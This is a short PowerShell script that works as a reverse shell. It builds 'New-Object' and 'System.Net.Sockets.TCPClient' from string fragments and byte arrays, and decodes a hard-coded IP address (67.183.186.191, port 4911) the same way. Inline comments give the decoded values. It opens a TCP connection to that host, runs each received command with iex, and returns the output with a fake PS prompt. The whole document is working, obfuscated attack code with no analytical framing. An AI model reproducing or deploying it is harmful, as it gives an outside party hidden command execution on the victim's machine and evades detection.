${v} = 'N'+'ew'+'-Ob'+'ject'

# TCPClient: System.Net.Sockets.TCPClient
${t} = [Text.Encoding]::ASCII.GetString(([byte[]](83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116)))
# IP: 67.183.186.191 (as string)
${ip} = [Text.Encoding]::ASCII.GetString(([byte[]](54,55,46,49,56,51,46,49,56,54,46,49,57,49)))
# Encoding type: System.Text.ASCIIEncoding
${enc} = [Text.Encoding]::ASCII.GetString(([byte[]](83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103)))

${tcp} = & ${v} ${t} (${ip},4911)
${s} = ${tcp}.GetStream()
[byte[]]${b} = 0..65499|%{0}

while ( (${i} = ${s}.Read(${b}, 0, ${b}.Length)) -ne 0 ) {
    ${cmd} = (&(${v}) ${enc}).GetString(${b},0,${i})
    ${o} = (iex ${cmd} 2>&1 | Out-String)
    ${o2} = ${o} + 'PS ' + (Get-Location).Path + '> '
    ${r} = ([Text.Encoding]::ASCII).GetBytes(${o2})
    ${s}.Write(${r},0,${r}.Length)
    ${s}.Flush()
}

${tcp}.Close()
Read-Host "Press Enter to exit"
